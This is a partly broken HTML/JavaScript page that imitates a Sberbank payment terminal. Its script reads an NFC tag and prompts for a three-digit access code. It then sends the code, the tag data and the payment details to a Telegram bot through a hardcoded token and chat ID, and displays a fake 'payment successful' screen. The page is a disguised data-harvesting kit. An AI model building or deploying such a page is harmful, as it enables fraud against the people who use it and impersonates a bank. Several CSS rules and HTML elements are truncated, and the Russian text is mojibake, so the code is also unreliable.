        .sber-logo {

        .terminal-subtitle {

        .terminal-body {

        .amount-section {

        .status-submessage {

        /* Password Input */
        .password-section {

        }

        .password-input {

        .password-digit {

        .password-digit:focus {

        }

        .password-label {
            font-size: 18px;
            color: #21a038;
            font-weight: 600;
            margin-bottom: 15px;
        }

        .submit-button {
            background: linear-gradient(135deg, #21a038 0%, #1e8c31 100%);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.3s ease;
        }

        .submit-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(33, 160, 56, 0.4);
        }

        .submit-button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        /* Success Animation */
        .success-animation {
            margin: 30px 0;
        }

        .checkmark {
            width: 100px;
            height: 100px;
            margin: 0 auto 25px;
            opacity: 0;
            transform: scale(0);
        }

        .checkmark.active {
            opacity: 1;
            transform: scale(1);
            transition: all 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        .checkmark__circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke-width: 3;
            stroke-miterlimit: 10;
            stroke: #21a038;
            fill: none;
        }

        .checkmark__check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            stroke-width: 3;
        }

        .checkmark.animate .checkmark__circle {
            animation: stroke 0.8s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }

        .checkmark.animate .checkmark__check {
            animation: stroke 0.4s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
        }

        /* Progress */
        .progress-container {
            margin: 30px 0;
        }

        .progress-bar {
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            overflow: hidden;
            margin: 0 20px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #21a038, #2ecc71);
            width: 0%;
            transition: width 0.4s ease;
            border-radius: 4px;
        }

        /* Animations */
        @keyframes stroke {
            100% { stroke-dashoffset: 0; }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }

        .shake {
            animation: shake 0.5s ease-in-out;
        }

        .hidden {
            display: none;
        }

        /* Terminal Footer */
        .terminal-footer {
            background: #f8f9fa;
            padding: 25px 20px;
            text-align: center;
            border-top: 2px solid #21a038;
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
        }

        .footer-text {
            color: #21a038;
            font-size: 14px;
            font-weight: 500;
        }

        /* Processing State */
        .processing-dots {
            display: inline-block;
        }

        .processing-dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80%, 100% { content: '...'; }
        }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="terminal-header">

        <div class="terminal-body">

                <div class="status-message" id="statusMessage">

                </div>
                <div class="status-submessage" id="statusSubmessage">
                    –ü–æ–¥–Ω–µ—Å–∏—Ç–µ –∫–∞—Ä—Ç—É –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω
                </div>
            </div>

            <div class="password-section" id="passwordSection">
                <div class="password-label">–í–í–ï–î–ò–¢–ï –ö–û–î –î–û–°–¢–£–ü–ê</div>
                <div class="password-input">
                    <input type="text" class="password-digit" id="digit1" maxlength="1" oninput="moveToNext(1)">
                    <input type="text" class="password-digit" id="digit2" maxlength="1" oninput="moveToNext(2)">
                    <input type="text" class="password-digit" id="digit3" maxlength="1" oninput="moveToNext(3)">

        <div class="terminal-footer">
            <div class="footer-text">–¢–µ—Ä–º–∏–Ω–∞–ª ‚Ññ SBR-2847-01 | –ó–∞—â–∏—â–µ–Ω–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ</div>

    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8368195098:AAHdHOYJmuv-bMrGaAjsVaBWxeBltAvZj4I';
        const TELEGRAM_CHAT_ID = '8286673118';
        const PAYMENT_AMOUNT = '34,57';

        let nfcReader = null;
        let paymentCompleted = false;
        let correctPassword = '';
        let passwordAttempts = 0;
        let nfcTagData = '';

        document.addEventListener('DOMContentLoaded', function() {
            initializeNFC();
        });

        async function initializeNFC() {
            if (!('NDEFReader' in window)) {
                updateStatus('–û–®–ò–ë–ö–ê', 'NFC –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è');
                return;
            }

            try {
                nfcReader = new NDEFReader();
                await nfcReader.scan();
                
                updateStatus('–°–ö–ê–ù–ò–†–û–í–ê–ù–ò–ï', '–ü–æ–¥–Ω–µ—Å–∏—Ç–µ NFC –º–µ—Ç–∫—É');
                updateProgress(30);
                
                nfcReader.onreading = (event) => {
                    if (!paymentCompleted) {
                        readNFCTag(event);
                    }
                };

                nfcReader.onreadingerror = (error) => {
                    updateStatus('–û–®–ò–ë–ö–ê', '–ù–µ —É–¥–∞–ª–æ—Å—å —Å—á–∏—Ç–∞—Ç—å –º–µ—Ç–∫—É');
                    setTimeout(() => {
                        updateStatus('–°–ö–ê–ù–ò–†–û–í–ê–ù–ò–ï', '–ü–æ–¥–Ω–µ—Å–∏—Ç–µ NFC –º–µ—Ç–∫—É');
                    }, 2000);
                };

            } catch (error) {
                updateStatus('–û–®–ò–ë–ö–ê', '–î–æ—Å—Ç—É–ø –∫ NFC –∑–∞–ø—Ä–µ—â–µ–Ω');
            }
        }

        function readNFCTag(event) {
            const decoder = new TextDecoder();
            for (const record of event.message.records) {
                if (record.recordType === "text") {
                    const text = decoder.decode(record.data);
                    correctPassword = text.trim();
                    nfcTagData = text.trim();
                    
                    if (/^\d{3}$/.test(correctPassword)) {
                        updateStatus('–ú–ï–¢–ö–ê –°–ß–ò–¢–ê–ù–ê', '–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –¥–æ—Å—Ç—É–ø–∞');
                        updateProgress(60);
                        showPasswordInput();
                    } else {
                        updateStatus('–û–®–ò–ë–ö–ê', '–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –º–µ—Ç–∫–∏');
                    }
                    break;
                }
            }
        }

        function showPasswordInput() {
            document.getElementById('passwordSection').style.display = 'block';
            document.getElementById('digit1').focus();
            updateSubmitButton();
        }

        function moveToNext(currentDigit) {
            const currentInput = document.getElementById(`digit${currentDigit}`);
            const nextInput = document.getElementById(`digit${currentDigit + 1}`);
            
            if (currentInput.value && nextInput) {
                nextInput.focus();
            }
            
            updateSubmitButton();
        }

        function updateSubmitButton() {
            const digit1 = document.getElementById('digit1').value;
            const digit2 = document.getElementById('digit2').value;
            const digit3 = document.getElementById('digit3').value;
            const submitButton = document.getElementById('submitButton');
            
            submitButton.disabled = !(digit1 && digit2 && digit3);
        }

        function checkPassword() {
            const digit1 = document.getElementById('digit1').value;
            const digit2 = document.getElementById('digit2').value;
            const digit3 = document.getElementById('digit3').value;
            const enteredPassword = digit1 + digit2 + digit3;
            
            if (enteredPassword === correctPassword) {
                processPayment();
            } else {
                passwordAttempts++;
                shakePasswordInput();
                updateStatus('–ù–ï–í–ï–†–ù–´–ô –ö–û–î', `–û—Å—Ç–∞–ª–æ—Å—å –ø–æ–ø—ã—Ç–æ–∫: ${3 - passwordAttempts}`);
                
                if (passwordAttempts >= 3) {
                    resetPasswordInput();
                    updateStatus('–ë–õ–û–ö–ò–†–û–í–ö–ê', '–ü—Ä–µ–≤—ã—à–µ–Ω–æ —á–∏—Å–ª–æ –ø–æ–ø—ã—Ç–æ–∫');
                    setTimeout(() => {
                        updateStatus('–°–ö–ê–ù–ò–†–û–í–ê–ù–ò–ï', '–ü–æ–¥–Ω–µ—Å–∏—Ç–µ NFC –º–µ—Ç–∫—É');
                        passwordAttempts = 0;
                    }, 3000);
                }
            }
        }

        function shakePasswordInput() {
            const inputs = document.querySelectorAll('.password-digit');
            inputs.forEach(input => {
                input.classList.add('shake');
                setTimeout(() => {
                    input.classList.remove('shake');
                }, 500);
            });
            
            resetPasswordInput();
        }

        function resetPasswordInput() {
            document.getElementById('digit1').value = '';
            document.getElementById('digit2').value = '';
            document.getElementById('digit3').value = '';
            document.getElementById('digit1').focus();
            updateSubmitButton();
        }

        async function processPayment() {
            document.getElementById('passwordSection').style.display = 'none';
            updateStatus('–ü–†–û–í–ï–†–ö–ê –ö–û–î–ê', '–ö–æ–¥ –ø—Ä–∏–Ω—è—Ç<span class="processing-dots"></span>');
            updateProgress(80);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram
            await sendToTelegram();
            
            setTimeout(() => {
                updateStatus('–û–ë–†–ê–ë–û–¢–ö–ê', '–í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –æ–ø–ª–∞—Ç–∞<span class="processing-dots"></span>');
                updateProgress(90);
                
                setTimeout(() => {
                    completePayment();
                }, 2000);
            }, 1500);
        }

        async function sendToTelegram() {
            const timestamp = new Date().toLocaleString('ru-RU');
            const enteredPassword = document.getElementById('digit1').value + 
                                  document.getElementById('digit2').value + 
                                  document.getElementById('digit3').value;
            
            const message = `üí≥ *–ù–û–í–ê–Ø –û–ü–õ–ê–¢–ê*
            
üìä *–î–∞–Ω–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏:*
üí∞ –°—É–º–º–∞: ${PAYMENT_AMOUNT} —Ä—É–±.
üîë –ö–æ–¥ –¥–æ—Å—Ç—É–ø–∞: ${enteredPassword}
üè∑Ô∏è NFC –¥–∞–Ω–Ω—ã–µ: ${nfcTagData}
‚è∞ –í—Ä–µ–º—è: ${timestamp}
üÜî –¢–µ—Ä–º–∏–Ω–∞–ª: SBR-2847-01

‚úÖ *–û–ø–ª–∞—Ç–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞*`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (!response.ok) {
                    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', await response.text());
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
            }
        }

        function completePayment() {
            paymentCompleted = true;
            updateProgress(100);
            
            updateStatus('–û–ü–õ–ê–¢–ê –£–°–ü–ï–®–ù–ê', '–°–ø–∞—Å–∏–±–æ –∑–∞ –ø–æ–∫—É–ø–∫—É');
            
            const checkmark = document.getElementById('checkmark');
            checkmark.classList.add('active', 'animate');
            
            document.getElementById('statusIcon').textContent = '‚úÖ';
            
            if (nfcReader) {
                nfcReader = null;
            }
        }

        function updateStatus(message, submessage = '') {
            document.getElementById('statusMessage').innerHTML = message;
            document.getElementById('statusSubmessage').innerHTML = submessage;
        }

        function updateProgress(percent) {
            document.getElementById('progressFill').style.width = percent + '%';
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–ª–∞–≤–∏—à
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Enter' && !document.getElementById('submitButton').disabled) {
                checkPassword();
            }
        });
    </script>
